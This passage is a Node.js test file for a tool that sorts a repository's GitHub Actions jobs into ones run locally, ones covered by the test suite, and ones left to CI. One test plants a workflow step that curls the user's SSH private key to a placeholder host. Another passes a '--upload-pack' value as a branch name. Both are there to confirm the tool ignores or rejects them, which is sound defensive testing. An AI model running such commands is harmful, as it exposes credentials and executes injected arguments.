import './helpers/test-home.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, writeFileSync, mkdirSync, mkdtempSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { workflowRunsOnPr } from '../src/autopilot-core.mjs';
import { parseWorkflowYaml, sortCiJobs, ciJobsSummary, readCiJobs, cachedCiSummary, localJobPlan, localJobResult, localJobsRecord, localJobReds,
  ciMergeNote, missedCiJobs, recordMissedCi, readMissedCi, noteMissedRedIssue, checkMissedCi, missedCiHeldLine } from '../src/autopilot-ci-jobs.mjs';

// Expected results come from issue #3260 (Serhan's decision B with CI job sorting, Nov 11) and the group 3 design,
// section E. The machine is fixed per test (a Linux runner with Node 22, unless a test says other), so the results
// are the same on the Mac and on the runner VM.
const root = new URL('../', import.meta.url).pathname;
const LINUX = { platform: 'linux', node: '22.16.0' };
const HEAD = 'a'.repeat(40), MERGE = 'b'.repeat(40), TIP = 'c'.repeat(40);
const sort = (files, extra = {}) => sortCiJobs({ files, base: 'main', testCommand: 'npm test', scripts: { test: 'node --test' }, machine: LINUX, ...extra });
const file = (name, text) => ({ name, text });
const byCheck = (result, check) => result.jobs.find(job => job.check === check);
const temp = t => { const dir = mkdtempSync(join(tmpdir(), 'pdd-ci-jobs-')); t.after(() => rmSync(dir, { recursive: true, force: true })); return dir; };
const ON_PR = 'on:\n  pull_request:\n  push:\n    branches: [main]\n';

test('sort: pdd\'s own ci.yml: the suite of the tests job is covered, its other steps and install-smoke run locally; the router is no PR CI', t => {
  const dir = join(root, '.github/workflows');
  const files = readdirSync(dir).sort().map(name => file(name, readFileSync(join(dir, name), 'utf8')));
  const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const result = sortCiJobs({ files, base: 'main', testCommand: 'npm test', scripts: pkg.scripts, machine: LINUX });
  // Release lead (Nov 11): the test step (npm test | tee, set +e, the PIPESTATUS exit) is covered by Autopilot's
  // suite and never runs again; "Summarize test counts" is a report step on the copied suite log; --help and npm
  // pack run locally; install-smoke is a local job.
  assert.equal(result.summary, 'CI: 1 covered (+2 local steps), 1 local, 0 CI-only');
  assert.deepEqual(result.jobs.map(job => [job.workflow, job.job, job.check, job.kind, job.suite]), [['ci.yml', 'public', 'tests', 'covered', true], ['ci.yml', 'install-smoke', 'install-smoke', 'local', false]]);
  const tests = byCheck(result, 'tests');
  assert.deepEqual(tests.steps.map(step => [step.name, Boolean(step.copy), Boolean(step.report)]), [['Run offline tests (covered: the full suite log is copied to its output)', true, false],
    ['Summarize test counts', false, true], ['node bin/pdd.mjs --help', false, false], ['npm pack --ignore-scripts --dry-run', false, false]]);
  assert.deepEqual(tests.steps[0].copy, ['"$RUNNER_TEMP/tests.tap"']);
  assert.equal(byCheck(result, 'install-smoke').steps.length, 1);
  assert.deepEqual(result.dropped, []);
  // The tests job runs locally on a saved suite log: the summary step reads the copied TAP totals.
  const scratch = temp(t), suiteLog = join(scratch, 'suite.log');
  writeFileSync(suiteLog, ['running the full test suite', 'ok 1 - a', 'ok 2 - b', '1..2', '# tests 2', '# suites 0', '# pass 2', '# fail 0', '# cancelled 0', '# skipped 0', '# todo 0', '# duration_ms 5.5', ''].join('\n'));
  const [plan] = localJobPlan({ jobs: [tests], head: HEAD, base: 'main', checkout: root, temp: join(scratch, 'tmp'), suiteLog, machine: LINUX });
  assert.deepEqual(plan.reports, ['Summarize test counts']);
  const r = spawnSync('/bin/bash', ['-c', plan.command], { cwd: root, encoding: 'utf8', env: { ...process.env, ...plan.env } });
  assert.equal(r.status, 0, `${r.stdout}${r.stderr}`.slice(-2000));
  assert.equal(readFileSync(plan.env.GITHUB_STEP_SUMMARY, 'utf8'), '### tests\n2/2 passed, 0 failed, 0 cancelled, 0 skipped, 0 todo.\n');
  assert.deepEqual(ciMergeNote({ jobs: result.jobs, record: localJobsRecord({ head: HEAD, plan: [plan], runs: { [plan.key]: { exit: { code: 0 }, log: r.stdout } } }), notStarted: { reason: 'queued', since: 0 } }).slice(0, 2), [
    '- CI: did not start (queued since 00:00 UTC); covered by the local full suite: tests',
    '- CI job tests: the full suite is covered; the other steps: local pass (report steps on the suite log: "Summarize test counts")']);
  assert.throws(() => localJobPlan({ jobs: [tests], head: HEAD, checkout: root, temp: join(scratch, 'tmp'), machine: LINUX }), /suiteLog must be the absolute path/);
});

test('E5: pdd\'s own ci.yml skips draft PRs, runs again at ready_for_review, keeps cancel-in-progress, and still counts as PR CI', () => {
  const text = readFileSync(join(root, '.github/workflows/ci.yml'), 'utf8'), wf = parseWorkflowYaml(text);
  assert.deepEqual(wf.on.pull_request.types, ['opened', 'synchronize', 'reopened', 'ready_for_review']);
  for (const job of Object.values(wf.jobs)) assert.equal(job.if, "github.event_name != 'pull_request' || github.event.pull_request.draft == false");
  assert.equal(wf.concurrency['cancel-in-progress'], true);
  assert.equal(workflowRunsOnPr(text, 'pdd/core-1-x', 'main'), true);
});

test('sort: the ticket\'s summary example "CI: 2 covered, 1 local, 1 CI-only (CodeQL)"', () => {
  const ci = `name: CI\n${ON_PR}jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n`
    + '  unit:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run test\n'
    + '  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n          key: npm\n      - run: npm ci\n      - run: npm run lint\n';
  const codeql = 'name: CodeQL\non:\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: "0 3 * * 1"\njobs:\n  analyze:\n    name: Analyze (${{ matrix.language }})\n    runs-on: ubuntu-latest\n    permissions:\n      security-events: write\n    strategy:\n      matrix:\n        language: [javascript-typescript]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n      - uses: github/codeql-action/analyze@v3\n';
  const result = sort([file('ci.yml', ci), file('codeql.yml', codeql)]);
  assert.equal(result.summary, 'CI: 2 covered, 1 local, 1 CI-only (CodeQL)');
  assert.deepEqual(result.jobs.map(job => [job.check, job.kind]), [['test', 'covered'], ['unit', 'covered'], ['lint', 'local'], ['Analyze (javascript-typescript)', 'ci-only']]);
  assert.deepEqual(byCheck(result, 'lint').commands, ['npm run lint']);
  assert.deepEqual(byCheck(result, 'test').commands, ['npm test']);
  assert.equal(byCheck(result, 'Analyze (javascript-typescript)').why, 'uses github/codeql-action/init@v3');
  assert.equal(ciJobsSummary([]), 'CI: none');
});

test('sort: a step with a secret makes its job CI-only, and the local plan never holds it', () => {
  const ci = `${ON_PR}jobs:\n  publish-check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish --dry-run\n        env:\n          NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(job => [job.check, job.kind, job.need]), [['publish-check', 'ci-only', 'secrets'], ['lint', 'local', null]]);
  assert.equal(result.summary, 'CI: 0 covered, 1 local, 1 CI-only (secrets)');
  const plan = localJobPlan({ jobs: result.jobs, head: HEAD, checkout: '/w/checkout', temp: '/w/temp', machine: LINUX });
  assert.deepEqual(plan.map(entry => entry.check), ['lint']);
  assert.ok(!plan.some(entry => /secrets|publish/.test(entry.command)));
  // A secret in the workflow's env reaches every job.
  assert.equal(sort([file('ci.yml', `${ON_PR}env:\n  TOKEN: \${{ secrets.X }}\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`)]).jobs[0].need, 'secrets');
});

test('sort: a macOS matrix on a Linux machine gives one CI-only entry; a version matrix is local for this machine\'s Node only', () => {
  const os = `${ON_PR}jobs:\n  test:\n    runs-on: \${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm test\n`;
  const a = sort([file('ci.yml', os)]);
  assert.deepEqual(a.jobs.map(job => [job.check, job.kind, job.checks, job.need]), [['test (ubuntu-latest)', 'covered', ['test (ubuntu-latest)'], null], ['test (macos-latest)', 'ci-only', ['test (macos-latest)'], 'macOS']]);
  assert.equal(a.jobs[1].why, 'runs on macos-latest (this machine is Linux)');
  assert.equal(a.summary, 'CI: 1 covered, 0 local, 1 CI-only (macOS)');
  const versions = `${ON_PR}jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [20, 22, 24]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node }}\n      - run: npm run build\n`;
  const b = sort([file('ci.yml', versions)]);
  assert.deepEqual(b.jobs.map(job => [job.check, job.kind, job.checks, job.need]), [['build (22)', 'local', ['build (22)'], null], ['build', 'ci-only', ['build (20)', 'build (24)'], 'Node 20, Node 24']]);
  assert.equal(b.jobs[1].why, 'uses Node 20 (this machine has Node 22.16.0), and 1 more');
  assert.deepEqual(b.jobs[0].matrix, { node: '22' });
  // include, exclude and an x version.
  const mixed = `${ON_PR}jobs:\n  t:\n    runs-on: \${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: ['22.x', '20.x']\n        exclude:\n          - os: windows-latest\n            node: '20.x'\n        include:\n          - os: ubuntu-latest\n            coverage: true\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node }}\n      - run: npm test\n`;
  assert.deepEqual(sort([file('ci.yml', mixed)]).jobs.map(job => [job.check, job.kind, job.checks]), [['t (ubuntu-latest, 22.x, true)', 'covered', ['t (ubuntu-latest, 22.x, true)']],
    ['t', 'ci-only', ['t (ubuntu-latest, 20.x, true)', 't (windows-latest, 22.x)']]]);
});

test('sort: an unreadable file or job is CI-only (fail safe)', () => {
  const result = sort([{ name: 'gone.yml', text: null, error: 'git cat-file failed' }, file('anchor.yml', `${ON_PR}jobs:\n  a: &x\n    runs-on: ubuntu-latest\n`),
    file('tab.yml', `${ON_PR}jobs:\n\tlint:\n`), file('nojobs.yml', `${ON_PR}name: x\n`), file('badjob.yml', `${ON_PR}jobs:\n  lint: npm run lint\n  nosteps:\n    runs-on: ubuntu-latest\n`)]);
  assert.deepEqual(result.jobs.map(job => [job.workflow, job.job, job.kind, job.need]), [['gone.yml', null, 'ci-only', 'unreadable'], ['anchor.yml', null, 'ci-only', 'unreadable'],
    ['tab.yml', null, 'ci-only', 'unreadable'], ['nojobs.yml', null, 'ci-only', 'unreadable'], ['badjob.yml', 'lint', 'ci-only', 'unreadable'], ['badjob.yml', 'nosteps', 'ci-only', 'unreadable']]);
  assert.equal(result.jobs[0].why, 'Autopilot could not read the workflow file: git cat-file failed');
  assert.match(result.jobs[1].why, /line 6: "&" \(an anchor/);
  assert.equal(result.summary, 'CI: 0 covered, 0 local, 6 CI-only (unreadable)');
  // More than 50 files: one entry, nothing read.
  const many = sort(Array.from({ length: 51 }, (_, i) => file(`w${i}.yml`, null)));
  assert.deepEqual(many.jobs.map(job => [job.workflow, job.need, job.why]), [[null, 'too many workflows', 'the base has 51 workflow files (more than 50)']]);
});

test('sort: a job condition decides for a ready PR; one that Autopilot cannot check is CI-only', () => {
  const job = (id, cond) => `  ${id}:\n    if: ${cond}\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`;
  const ci = `${ON_PR}jobs:\n${job('draft', "github.event_name != 'pull_request' || github.event.pull_request.draft == false")}${job('push-only', "github.event_name == 'push'")}`
    + `${job('wrapped', '${{ !github.event.pull_request.draft }}')}${job('unknown', "contains(github.event.head_commit.message, 'x')")}${job('actor', "github.actor == 'me'")}`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(entry => [entry.check, entry.kind, entry.need]), [['draft', 'local', null], ['wrapped', 'local', null], ['unknown', 'ci-only', 'condition'], ['actor', 'ci-only', 'condition']]);
});

test('sort: steps that need GitHub (actions, services, deploys, other shells, unknown expressions, GITHUB_ENV, sudo) make the job CI-only', () => {
  const steps = body => `    runs-on: ubuntu-latest\n    steps:\n${body}`;
  const ci = `${ON_PR}jobs:\n`
    + `  deploy:\n    environment: production\n${steps('      - run: ./deploy.sh\n')}`
    + `  db:\n    services:\n      postgres:\n        image: postgres\n${steps('      - run: npm run db-test\n')}`
    + `  pwsh:\n${steps('      - run: Get-ChildItem\n        shell: pwsh\n')}`
    + `  outputs:\n${steps('      - run: echo ${{ steps.meta.outputs.tag }}\n')}`
    + `  env-pass:\n${steps('      - run: echo "X=1" >> "$GITHUB_ENV"\n      - run: npm run lint\n')}`
    + `  root:\n${steps('      - run: sudo make install\n')}`
    + `  mixed-install:\n${steps('      - run: |\n          sudo apt-get install -y jq\n          npm run lint\n')}`
    + `  docker:\n${steps('      - uses: docker://alpine:3\n')}`
    + '  reuse:\n    uses: ./.github/workflows/shared.yml\n'
    + `  boxed:\n    container: node:22\n${steps('      - run: npm run lint\n')}`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(job => [job.check, job.need]), [['deploy', 'environment'], ['db', 'services'], ['pwsh', 'shell'], ['outputs', 'expression'], ['env-pass', 'GITHUB_ENV'],
    ['root', 'sudo'], ['mixed-install', 'system packages'], ['docker', 'docker image'], ['reuse', 'reusable workflow'], ['boxed', 'container']]);
  assert.ok(result.jobs.every(job => job.kind === 'ci-only'));
  assert.equal(result.jobs[3].why, 'uses the expression ${{ steps.meta.outputs.tag }}');
});

test('sort: setup steps never run; the known expressions, defaults and working directories carry into the local steps', () => {
  const ci = `${ON_PR}env:\n  LEVEL: strict\ndefaults:\n  run:\n    shell: bash\njobs:\n  check:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        part: [api]\n    defaults:\n      run:\n        working-directory: \${{ github.workspace }}/packages/\${{ matrix.part }}\n    steps:\n`
    + '      - run: node --version\n      - run: |\n          if ! command -v jq; then\n            sudo apt-get update\n            sudo apt-get install -y jq\n          fi\n      - run: yarn --frozen-lockfile\n'
    + '      - name: Types\n        run: npm run typecheck -- --level "${{ env.LEVEL }}" --os ${{ runner.os }} --part ${{ matrix.part }}\n        env:\n          OUT: ${{ runner.temp }}/types\n'
    + '      - run: npm run flaky\n        continue-on-error: true\n      - if: failure()\n        run: echo failed\n      - if: always()\n        run: echo done >> "$GITHUB_STEP_SUMMARY"\n';
  const [entry] = sort([file('ci.yml', ci)]).jobs;
  assert.equal(entry.kind, 'local');
  assert.equal(entry.check, 'check (api)');
  assert.deepEqual(entry.steps, [{ name: 'Types', shell: 'bash', script: 'npm run typecheck -- --level "${{ env.LEVEL }}" --os ${{ runner.os }} --part ${{ matrix.part }}',
    workingDirectory: 'packages/api', env: { LEVEL: 'strict', OUT: '${{ runner.temp }}/types' } }]);
  const [plan] = localJobPlan({ jobs: [entry], head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  assert.deepEqual(plan.steps[0].args, ['--noprofile', '--norc', '-eo', 'pipefail', '-c', 'npm run typecheck -- --level "strict" --os Linux --part api']);
  assert.equal(plan.steps[0].cwd, '/w/co/packages/api');
  assert.equal(plan.steps[0].env.OUT, '/w/tmp/job-1/runner-temp/types');
  // A working directory outside the checkout is CI-only.
  assert.equal(sort([file('ci.yml', `${ON_PR}jobs:\n  up:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n        working-directory: ../other\n`)]).jobs[0].need, 'working directory');
});

test('YAML subset: block scalars, compact maps, flow collections, quotes and comments', () => {
  const value = parseWorkflowYaml(['---', '# a comment', 'a: plain text # gone', "b: 'it''s'", 'c: "tab\\there \\u0041"', 'd: [1, two, "3, 4", {e: f}]', 'g: {h: [i, j], k: }',
    'list:', '- x', '- y: 1', '  z: 2', '- - nested', '  - more', 'lit: |-', '  line 1', '    indented', '', '  line 3', 'folded: >', '  one', '  two', '', '  three', 'keep: |+', '  k', '', 'empty:', 'bool: false', 'nil: ~', '...'].join('\n'));
  assert.deepEqual(value, { a: 'plain text', b: "it's", c: 'tab\there A', d: ['1', 'two', '3, 4', { e: 'f' }], g: { h: ['i', 'j'], k: null },
    list: ['x', { y: '1', z: '2' }, ['nested', 'more']], lit: 'line 1\n  indented\n\nline 3', folded: 'one two\nthree\n', keep: 'k\n\n', empty: null, bool: false, nil: null });
  const refused = { 'a: *x': /alias/, 'a: !cancelled()': /tag/, 'a: 1\na: 2': /comes twice/, 'a: "open': /several lines/, 'a: 1\n---\nb: 2': /second document/,
    'a: b: c': /quote the value/, 'a:\n  b: 1\n c: 2': /unexpected indentation/, '<<: {a: 1}': /merge keys/, 'a: [1,\n 2]': /several lines/, 'a: x\n  y': /unexpected indentation/, 'a: |\n  x\n b: 1': /unexpected indentation/ };
  for (const [source, why] of Object.entries(refused)) assert.throws(() => parseWorkflowYaml(source), error => error.code === 'yaml' && why.test(error.message), source);
  assert.throws(() => parseWorkflowYaml('a: 1\n'.repeat(5001)), /more than 5000 lines/);
});

// A git repository with a remote: main has a workflow; a PR branch (checked out) changes it.
function gitRepo(t) {
  const dir = temp(t), remote = join(dir, 'remote.git'), work = join(dir, 'work');
  const git = (cwd, ...args) => { const r = spawnSync('git', args, { cwd, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@x' } }); if (r.status !== 0) throw new Error(r.stderr); return r.stdout; };
  git(dir, 'init', '-q', '--bare', '-b', 'main', remote);
  git(dir, 'init', '-q', '-b', 'main', work);
  git(work, 'remote', 'add', 'origin', remote);
  const write = (path, text) => { mkdirSync(join(work, path, '..'), { recursive: true }); writeFileSync(join(work, path), text); };
  const calls = [];
  const port = async args => { calls.push(args[0]); const r = spawnSync('git', args, { cwd: work, encoding: 'utf8' }); if (r.status !== 0) throw new Error(`git ${args[0]} failed: ${r.stderr}`); return r.stdout.trim(); };
  return { work, git: (...args) => git(work, ...args), write, port, calls };
}

test('read: a PR head that changes a workflow does not change the list (only the base tip counts); the cache follows the tree id', async t => {
  const r = gitRepo(t), state = temp(t);
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`);
  r.write('README.md', 'x\n');
  r.git('add', '.'); r.git('commit', '-q', '-m', 'base'); r.git('push', '-q', 'origin', 'main');
  r.git('checkout', '-q', '-b', 'pdd/core-7-x');
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d @$HOME/.ssh/id_rsa https://example.invalid\n`);
  r.write('.github/workflows/extra.yml', `${ON_PR}jobs:\n  more:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run more\n`);
  r.git('add', '.'); r.git('commit', '-q', '-m', 'head changes the workflow'); r.git('push', '-q', 'origin', 'pdd/core-7-x');
  const input = { base: 'main', branch: 'pdd/core-7-x', testCommand: 'npm test', machine: LINUX, root: state };
  const first = await readCiJobs(input, { git: r.port });
  assert.deepEqual(first.jobs.map(job => [job.workflow, job.check, job.kind, job.commands]), [['ci.yml', 'lint', 'local', ['npm run lint']]]);
  assert.equal(first.summary, 'CI: 0 covered, 1 local, 0 CI-only');
  assert.equal(cachedCiSummary({ root: state }), 'CI: 0 covered, 1 local, 0 CI-only');
  assert.ok(r.calls.includes('cat-file'));
  // Same base tree: the cache answers, no file is read again.
  r.calls.length = 0;
  assert.deepEqual((await readCiJobs(input, { git: r.port })).jobs, first.jobs);
  assert.ok(!r.calls.includes('cat-file'));
  // The base moves and its workflow tree changes: read again.
  r.git('checkout', '-q', 'main');
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  types:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run typecheck\n`);
  r.git('commit', '-q', '-am', 'base adds a job'); r.git('push', '-q', 'origin', 'main');
  r.calls.length = 0;
  const moved = await readCiJobs(input, { git: r.port });
  assert.deepEqual(moved.jobs.map(job => job.check), ['lint', 'types']);
  assert.ok(r.calls.includes('cat-file'));
  assert.notEqual(moved.tree, first.tree);
  await assert.rejects(readCiJobs({ ...input, base: '--upload-pack=x' }, { git: r.port }), /base must be a branch name/);
});

test('read: no workflow folder is no CI; a git error and a large file are CI-only', async t => {
  const r = gitRepo(t);
  r.write('README.md', 'x\n'); r.git('add', '.'); r.git('commit', '-q', '-m', 'base'); r.git('push', '-q', 'origin', 'main');
  assert.deepEqual(await readCiJobs({ base: 'main' }, { git: r.port }), { tree: null, jobs: [], summary: 'CI: none', dropped: [] });
  const failed = await readCiJobs({ base: 'main' }, { git: async () => { throw new Error('git rev-parse failed: no such ref'); } });
  assert.deepEqual(failed.jobs.map(job => [job.workflow, job.kind, job.need]), [[null, 'ci-only', 'unreadable']]);
  assert.equal(failed.summary, 'CI: 0 covered, 0 local, 1 CI-only (unreadable)');
  r.write('.github/workflows/big.yml', `${ON_PR}# ${'x'.repeat(256 * 1024)}\njobs: {}\n`);
  r.git('add', '.'); r.git('commit', '-q', '-m', 'big'); r.git('push', '-q', 'origin', 'main');
  const big = await readCiJobs({ base: 'main' }, { git: r.port });
  assert.deepEqual(big.jobs.map(job => [job.workflow, job.why]), [['big.yml', 'Autopilot could not read the workflow file: the file is larger than 256 KiB']]);
});

// Review round 1 (Codex), items 4 to 6, and their probe (core/g3/r1-probes/ci-probe.test.mjs): expected results from
// the review and the group lead's rules, not from the code.
const oneJob = (body, top = '') => sort([file('ci.yml', `${ON_PR}${top}jobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n${body}`)]).jobs[0];
function runLocal(entry, dir) {
  const [plan] = localJobPlan({ jobs: [entry], head: HEAD, checkout: dir, temp: join(dir, 'tmp'), machine: LINUX });
  const r = spawnSync('/bin/bash', ['-c', plan.command], { cwd: dir, encoding: 'utf8', env: { ...process.env, ...plan.env } });
  return localJobResult(plan, { exit: { code: r.status, signal: r.signal }, log: `${r.stdout}${r.stderr}` });
}

test('review R1 item 4: the full test command in another directory, shell or environment is no covered job; it runs there', t => {
  const dir = temp(t);
  mkdirSync(join(dir, 'nested'));
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'node -e "process.exit(0)"' } }));
  writeFileSync(join(dir, 'nested/package.json'), JSON.stringify({ scripts: { test: 'node -e "process.exit(1)"' } }));
  const nested = oneJob('      - run: npm test\n        working-directory: nested\n');
  assert.deepEqual([nested.kind, nested.suite, nested.commands, nested.steps[0].workingDirectory], ['local', false, ['npm test'], 'nested']);
  // The nested package's tests fail: the local job is red, as CI would be.
  assert.deepEqual([runLocal(nested, dir).state, runLocal(nested, dir).step], ['fail', 'npm test']);
  assert.equal(oneJob('      - run: npm test\n        shell: sh\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n        env:\n          NODE_ENV: production\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n', 'env:\n  SHARD: 2\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n', 'defaults:\n  run:\n    working-directory: nested\n').kind, 'local');
  // The full suite's own context stays covered.
  for (const body of ['      - run: npm test\n', '      - run: npm test\n        shell: bash\n        working-directory: .\n', '      - run: npm test\n        env:\n          CI: true\n'])
    assert.equal(oneJob(body).kind, 'covered', body);
});

test('review R1 item 5: a step that writes state is kept and run; only a step that changes nothing is setup', t => {
  const dir = temp(t);
  writeFileSync(join(dir, 'mode'), 'relaxed\n');
  // CI writes "strict" and then checks for "relaxed": the workflow fails, so the local job must fail too.
  const entry = oneJob('      - run: echo strict > mode\n      - run: test "$(cat mode)" = relaxed\n');
  assert.deepEqual([entry.kind, entry.commands], ['local', ['echo strict > mode', 'test "$(cat mode)" = relaxed']]);
  assert.deepEqual([runLocal(entry, dir).state, runLocal(entry, dir).step], ['fail', 'test "$(cat mode)" = relaxed']);
  const kept = ['echo "dir=$(npm config get cache)" >> "$GITHUB_OUTPUT"', "printf '%s' a | tee list.txt", 'echo x >| out.txt', 'X=$(date)', 'command -v jq > where.txt', 'echo `id`'];
  for (const command of kept) assert.deepEqual(oneJob(`      - run: ${JSON.stringify(command)}\n`).commands, [command], command);
  const nothing = ['echo hello', 'echo x > /dev/null', 'echo "## Report" >> "$GITHUB_STEP_SUMMARY"', 'node --version 2>&1', 'printf "%s\\n" done >&2', 'export A=1 B'];
  for (const command of nothing) assert.deepEqual([oneJob(`      - run: ${JSON.stringify(command)}\n`).kind, oneJob(`      - run: ${JSON.stringify(command)}\n`).why], ['covered', 'runs only setup steps'], command);
});

test('review R1 item 6: an always() step runs like any other step; only a pure summary write is no command', t => {
  const dir = temp(t);
  const failing = oneJob('      - run: npm test\n      - if: always()\n        run: |\n          node -e "process.exit(1)"\n          echo summary >> "$GITHUB_STEP_SUMMARY"\n');
  // The suite step is covered; the always() step is a local step of the job, and it fails.
  assert.deepEqual([failing.kind, failing.suite, failing.steps.map(step => step.script)], ['covered', true, ['node -e "process.exit(1)"\necho summary >> "$GITHUB_STEP_SUMMARY"\n']]);
  assert.equal(runLocal(failing, dir).state, 'fail');
  const pure = oneJob('      - run: npm test\n      - if: always()\n        run: echo "### tests passed" >> "$GITHUB_STEP_SUMMARY"\n');
  assert.deepEqual([pure.kind, pure.steps], ['covered', []]);
  assert.deepEqual(oneJob('      - run: npm test\n      - if: \'!cancelled()\'\n        run: npm run lint\n').steps.map(step => step.script), ['npm run lint']);
});

test('a covered suite step that tees its output never runs again; a later step reads Autopilot\'s copied suite log as a report step', t => {
  const tee = '      - run: npm test 2>&1 | tee "$RUNNER_TEMP/tests.tap"\n';
  const read = oneJob(`${tee}      - run: grep -c "^ok" "$RUNNER_TEMP/tests.tap"\n`);
  assert.deepEqual([read.kind, read.suite, read.commands], ['covered', true, ['npm test 2>&1 | tee "$RUNNER_TEMP/tests.tap"']]);
  assert.deepEqual(read.steps.map(step => [step.copy ?? null, step.script, Boolean(step.report)]), [[['"$RUNNER_TEMP/tests.tap"'], null, false], [null, 'grep -c "^ok" "$RUNNER_TEMP/tests.tap"', true]]);
  assert.equal(ciJobsSummary([read]), 'CI: 1 covered, 0 local, 0 CI-only');
  const dir = temp(t), suiteLog = join(dir, 'suite.log');
  writeFileSync(suiteLog, 'ok 1 - a\nok 2 - b\n');
  const [plan] = localJobPlan({ jobs: [read], head: HEAD, checkout: dir, temp: join(dir, 'tmp'), suiteLog, machine: LINUX });
  const r = spawnSync('/bin/bash', ['-c', plan.command], { cwd: dir, encoding: 'utf8', env: { ...process.env, ...plan.env } });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /^2$/m);
  // No later local step: no copy step. A plain suite step next to a local command: covered, with one local step.
  assert.deepEqual(oneJob(`${tee}      - if: always()\n        run: echo done >> "$GITHUB_STEP_SUMMARY"\n`).steps, []);
  const lint = oneJob('      - run: npm test\n      - run: npm run lint\n');
  assert.deepEqual([lint.kind, lint.suite, lint.steps.map(step => step.script), ciJobsSummary([lint])], ['covered', true, ['npm run lint'], 'CI: 1 covered (+1 local step), 0 local, 0 CI-only']);
  // A later step that changes state (a redirection to a file) is no report step: it is a local step.
  assert.equal(oneJob(`${tee}      - run: cat "$RUNNER_TEMP/tests.tap" > out.tap\n`).steps[1].report, undefined);
});

// Claude review round 1 (the "ci" items) and its probes (scratchpad ci/probe1-6.mjs): expected results from the review
// and the group lead's rules.
test('Claude review 4: two jobs with one check name, or a matrix name without an axis, keep their own results', () => {
  const wf = "on:\n  pull_request:\njobs:\n  t:\n    name: Test (${{ matrix.os }})\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest]\n        shard: ['1', '2']\n    steps:\n      - run: npm run e2e -- --shard ${{ matrix.shard }}/2\n"
    + '  lint:\n    name: check\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  types:\n    name: check\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run typecheck\n';
  const { jobs } = sort([file('ci.yml', wf)]);
  assert.deepEqual(jobs.map(job => [job.key, job.check, job.duplicate]), [['ci.yml#t#0', 'Test (ubuntu-latest)', true], ['ci.yml#t#1', 'Test (ubuntu-latest)', true], ['ci.yml#lint#0', 'check', true], ['ci.yml#types#0', 'check', true]]);
  const plan = localJobPlan({ jobs, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  // Shard 1 and lint fail; shard 2 and types pass: two reds, and each note line names one job.
  const runs = Object.fromEntries(plan.map((entry, i) => [entry.key, { exit: { code: [1, 0, 1, 0][i] }, log: 'pdd-ci-local: step 1 failed with exit 1\n' }]));
  const record = localJobsRecord({ head: HEAD, plan, runs });
  assert.equal(localJobReds(record).length, 2);
  assert.deepEqual(ciMergeNote({ jobs, record, notStarted: { reason: 'queued', since: 0 } }).slice(1), [
    '- CI job Test (ubuntu-latest) (job t, os ubuntu-latest, shard 1): local fail (step "npm run e2e -- --shard 1/2", exit 1)',
    '- CI job Test (ubuntu-latest) (job t, os ubuntu-latest, shard 2): local pass', '- CI job check (job lint): local fail (step "npm run lint", exit 1)', '- CI job check (job types): local pass']);
});

test('Claude review 6: a -v that is not a known version flag is real work; a lone version print stays setup', () => {
  assert.deepEqual(oneJob('      - run: ./scripts/e2e.sh -v\n').commands, ['./scripts/e2e.sh -v']);
